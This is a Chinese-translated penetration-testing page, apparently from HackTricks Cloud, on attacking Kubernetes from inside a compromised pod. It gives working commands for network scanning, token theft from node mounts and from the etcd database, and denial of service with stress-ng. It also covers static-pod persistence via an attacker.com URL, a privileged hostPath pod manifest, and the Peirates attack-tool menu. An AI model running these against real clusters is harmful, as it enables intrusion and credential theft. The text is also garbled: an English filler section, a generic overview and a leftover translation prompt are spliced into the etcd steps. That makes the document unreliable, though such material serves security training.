# 从Pod内部攻击Kubernetes

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## **Pod逃逸**

**如果你足够幸运，你可能能够从Pod中逃逸到节点：**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### 从Pod中逃逸

为了尝试从Pod中逃逸，您可能需要首先**提升特权**，有一些技术可以做到这一点：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

您可以检查这些**Docker逃逸**来尝试逃离您已经入侵的Pod：

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### 滥用Kubernetes特权

如在关于**Kubernetes枚举**的部分所述：

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

通常，Pods在其内部运行一个**服务账户令牌**。这个服务账户可能附加了一些**特权**，您可以**滥用**这些特权来**移动**到其他Pods，甚至**逃逸**到集群内配置的节点。了解如何操作：

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### 滥用云特权

如果Pod在**云环境**中运行，您可能能够从元数据端点**泄漏令牌**并使用它来提升特权。

## 搜索易受攻击的网络服务

由于您位于Kubernetes环境中，如果您无法滥用当前Pod的特权或无法逃离容器，您应该**搜索潜在易受攻击的服务**。

### 服务

**为此，您可以尝试获取Kubernetes环境中的所有服务：**
```
kubectl get svc --all-namespaces
```
默认情况下，Kubernetes使用扁平的网络架构，这意味着**集群中的任何Pod/Service都可以相互通信**。**命名空间**在默认情况下**没有任何网络安全限制**。命名空间中的任何人都可以与其他命名空间通信。

### 扫描

以下Bash脚本（来自[Kubernetes工作坊](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)）将安装并扫描Kubernetes集群的IP范围：
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
请查看以下页面，了解如何攻击Kubernetes特定服务以侵入其他Pod/整个环境：

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### 嗅探

如果**被入侵的Pod正在运行一些敏感服务**，其他Pod需要进行身份验证，您可能能够通过**嗅探本地通信**来获取其他Pod发送的凭据。

## 网络欺骗

默认情况下，诸如**ARP欺骗**（以及由此引发的**DNS欺骗**）等技术在Kubernetes网络中起作用。然后，在一个Pod内部，如果您具有**NET_RAW功能**（默认情况下存在），您将能够发送自定义的网络数据包并通过ARP欺骗对同一节点中运行的所有Pod执行**中间人攻击**。\
此外，如果**恶意Pod**正在与**DNS服务器**运行在**同一节点**上，您将能够对集群中的所有Pod执行**DNS欺骗攻击**。

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## 节点拒绝服务（DoS）

Kubernetes清单中没有资源规范和容器的**限制范围**。作为攻击者，我们可以**消耗Pod/部署运行的所有资源**，使其他资源饥饿，并导致环境的拒绝服务（DoS）。

可以使用诸如[**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng)的工具来实现此目的：
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
您可以在运行`stress-ng`之前和之后看到差异。
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## 节点后渗透

如果你成功**逃离容器**，你会在节点上发现一些有趣的东西：

* 容器运行时进程（Docker）
* 在节点上运行的更多**Pod/容器**，你可以像这个一样滥用（更多令牌）
* 整个**文件系统**和**操作系统**一般
* 正在监听的**Kube-Proxy**服务
* 正在监听的**Kubelet**服务。检查配置文件：
* 目录：`/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* 其他**Kubernetes常见文件**：
* `$HOME/.kube/config` - **用户配置**
* `/etc/kubernetes/kubelet.conf`- **常规配置**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **引导配置**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd配置**
* `/etc/kubernetes/pki` - **Kubernetes密钥**

### 查找节点kubeconfig

如果你在之前提到的路径中找不到kubeconfig文件，请**检查kubelet进程的`--kubeconfig`参数**：
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### 偷取机密信息

To steal secrets from within a Kubernetes pod, you can use various techniques. Here are a few methods:

1. **Pod-to-Pod Communication**: If the target pod has network access to other pods, you can exploit this communication channel to intercept and steal sensitive information.

2. **Pod Misconfiguration**: Check if the pod is misconfigured and allows unauthorized access to its filesystem. If so, you can navigate through the pod's file system and search for any files containing sensitive data.

3. **API Access**: If the pod has access to the Kubernetes API server, you can use this access to retrieve secrets stored in Kubernetes Secrets or ConfigMaps.

4. **Environment Variables**: Check if the pod's environment variables contain any sensitive information. You can access these variables from within the pod and extract the data.

5. **Logs**: Analyze the pod's logs for any potential leakage of sensitive information. Sometimes, developers may inadvertently log sensitive data, providing an opportunity for exploitation.

Remember, stealing secrets from within a pod requires careful reconnaissance and understanding of the pod's configuration and environment.
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
脚本[**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh)将自动获取其他Pod的令牌并检查它们是否具有您正在查找的权限（而不是您逐个查找）。
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### 特权的DaemonSets

DaemonSet是一个**pod**，将在**集群的所有节点上运行**。因此，如果一个DaemonSet配置了一个**特权的服务账户**，在**所有节点**上你将能够找到该**特权服务账户**的**令牌**，你可以滥用它。

这个漏洞与前一节中的漏洞相同，但现在你不再依赖运气。

### 切换到云端

如果集群由云服务管理，通常**节点对元数据端点的访问权限与Pod不同**。因此，尝试从节点（或从hostNetwork为True的Pod）**访问元数据端点**：

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

### 窃取etcd

如果你可以指定将运行容器的节点的[**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node)，在控制平面节点内获取一个shell并获取**etcd数据库**：
```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```
控制平面节点具有**主节点角色**，在**云托管集群中，您将无法在这些节点上运行任何内容**。

#### 从etcd中读取秘密

如果您可以使用pod规范中的`nodeName`选择器在控制平面节点上运行您的pod，那么您可能很容易访问`etcd`数据库，该数据库包含了集群的所有配置，包括所有秘密。

下面是一种快速而简单的方法，可以从正在运行的控制平面节点上的`etcd`中获取秘密。如果您想要一个更优雅的解决方案，可以使用`etcdctl`作为`etcd`客户端实用程序，在控制平面节点的凭据下连接到etcd的任何位置，可以查看@mauilion的[示例清单](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml)。

**检查`etcd`是否在控制平面节点上运行，并查看数据库所在位置（这是在`kubeadm`创建的集群上）**
```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```
# 从Pod内部攻击Kubernetes

在Kubernetes集群中，Pod是最小的可部署单元。Pod是由一个或多个容器组成的，它们共享相同的网络命名空间和存储卷。在某些情况下，攻击者可能能够通过在Pod内部执行恶意操作来攻击Kubernetes集群。

以下是一些从Pod内部攻击Kubernetes的技术：

## 1. 利用容器逃逸

攻击者可以尝试利用容器逃逸技术来从Pod内部访问宿主机操作系统。这可以通过利用容器运行时的漏洞或配置错误来实现。一旦攻击者成功逃逸出容器，他们可以在宿主机上执行任意命令，甚至访问整个Kubernetes集群。

## 2. 横向移动

一旦攻击者成功进入一个Pod，他们可以尝试在集群内进行横向移动。攻击者可以利用Kubernetes的API和服务发现功能来发现其他Pod，并尝试利用它们的漏洞或弱点进行攻击。

## 3. 窃取敏感信息

攻击者可以在Pod内部执行代码来窃取敏感信息，如访问令牌、密码、证书等。这些信息可以用于进一步的攻击，如访问其他Pod或集群资源。

## 4. 篡改或破坏应用程序

攻击者可以修改或破坏Pod内部运行的应用程序。这可以通过修改应用程序的配置文件、篡改应用程序的代码或破坏应用程序的运行环境来实现。这可能导致应用程序的崩溃、数据泄露或其他安全问题。

要防止从Pod内部攻击Kubernetes，可以采取以下措施：

- 限制Pod的权限，确保Pod只能访问必要的资源和服务。
- 使用容器运行时的安全功能，如Seccomp和AppArmor，来限制容器的行为。
- 定期更新和修补容器镜像，以防止已知的漏洞和安全问题。
- 监控和审计Pod的活动，以便及时发现和响应潜在的攻击。

了解这些攻击技术和防御措施可以帮助您更好地保护Kubernetes集群免受内部攻击的威胁。
```bash
data-dir=/var/lib/etcd
```
**查看 etcd 数据库中的数据：**
```bash
strings /var/lib/etcd/member/snap/db | less
```
**从数据库中提取令牌并显示服务账户名称**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```
**相同的命令，但使用一些grep命令只返回kube-system命名空间中的默认令牌**
```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```
以下是一本关于黑客技术的书籍中的内容。以下内容来自文件/hive/hacktricks-cloud/pentesting-cloud/kubernetes-security/attacking-kubernetes-from-inside-a-pod.md。将相关的英文文本翻译成中文，并返回翻译结果，保持完全相同的markdown和html语法。不要翻译代码、黑客技术名称、黑客术语、云/SaaS平台名称（如Workspace、aws、gcp...）、泄漏一词、渗透测试和markdown标签。此外，请不要添加任何额外的内容，只需提供翻译和markdown语法即可。
```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```
### 静态/镜像化Pod的持久性

_静态Pod_由特定节点上的kubelet守护程序直接管理，而无需API服务器观察它们。与由控制平面管理的Pod（例如，部署）不同；相反，**kubelet会监视每个静态Pod**（如果失败，则重新启动它）。

因此，静态Pod始终**绑定到特定节点上的一个Kubelet**。

**kubelet会自动尝试在Kubernetes API服务器上创建一个镜像Pod**，这意味着在节点上运行的Pod在API服务器上可见，但无法从那里进行控制。Pod名称将以节点主机名为后缀，并带有前导连字符。

{% hint style="danger" %}
静态Pod的**`spec`不能引用其他API对象**（例如，ServiceAccount、ConfigMap、Secret等）。因此，**无法利用此行为在当前节点上启动具有任意serviceAccount的Pod**来破坏集群。但是，您可以使用此方法在不同的命名空间中运行Pod（如果有某种原因需要）。
{% endhint %}

如果您在节点主机内部，可以让其创建一个**静态Pod**。这非常有用，因为它可能允许您在不同的命名空间（如**kube-system**）中创建一个Pod。

要创建静态Pod，[**文档是很好的帮助**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/)。您基本上需要两件事：

* 在**kubelet服务**或**kubelet配置**（[**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)）中配置参数**`--pod-manifest-path=/etc/kubernetes/manifests`**，然后重新启动服务
* 在**`/etc/kubernetes/manifests`**中的**Pod定义**中创建配置

**另一种更隐蔽的方法是：**

* 修改**kubelet**配置文件中的参数**`staticPodURL`**，并设置为类似`staticPodURL: http://attacker.com:8765/pod.yaml`的内容。这将使kubelet进程根据指定的URL创建一个**静态Pod**。

以下是从[**此处**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/)获取的在**kube-system**中创建特权Pod的**Pod**配置示例：
```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```
### 删除Pods + 不可调度的节点

如果攻击者**入侵了一个节点**，他可以从其他节点**删除Pods**并使其他节点无法执行Pods，那么Pods将在被入侵的节点上重新运行，攻击者将能够**窃取其中运行的令牌**。\
有关[**更多信息，请参考此链接**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes)。

## 自动化工具

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)
```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想看到您的公司在 HackTricks 中被广告，或者如果您想访问最新版本的 PEASS 或下载 HackTricks 的 PDF，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或在 **Twitter** 上 **关注** 我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向 [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来 **分享您的黑客技巧**。

</details>
